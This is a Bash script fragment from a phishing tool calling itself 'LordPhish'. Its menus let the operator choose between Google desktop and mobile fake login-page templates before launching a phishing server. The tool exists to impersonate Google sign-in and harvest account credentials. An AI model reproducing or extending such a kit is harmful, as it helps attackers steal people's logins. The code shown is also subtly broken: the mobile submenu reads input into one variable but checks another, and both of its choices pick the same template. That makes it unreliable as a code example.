#!/usr/bin/env bash

Google() {
    banner
    printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;96m Google to PC\e[0m\n"
    printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;96m Google Mobile\e[0m\n"
    printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;96m Google Advanced pool\e[0m\n"
    
    read -p $'\n\e[41m\e[1;36mLordPhish>>\e[0m\e[1;32m \en' google_menu
    
if [[ $google_menu == 1 || $google_menu == 01 ]]; then
server="Google_pc"
start1
    
elif [[ $google_menu == 2 || $google_menu == 02 ]]; then
list_gm

elif [[ $google_menu == 3 || $google_menu == 03 ]]; then
server="advpool"
start1

else
printf "\e[1;93m [!] Invalid option!\e[0m\n"
menu
fi
}

list_gm() {
    banner
    
    printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;96m Google Mobile\e[0m\n"
    printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;96m Google Mobile V2\e[0m\n"
    read -p $'\n\e[41m\e[1;36mLordPhish>>\e[0m\e[1;32m \en' gm_op 
if [[ $option == 1 || $option == 01 ]]; then
server="google_mobile"
start1
    
elif [[ $option == 2 || $option == 02 ]]; then
server="google_mobile"
start1

else
printf "\e[1;93m [!] Invalid option!\e[0m\n"
menu
fi
}
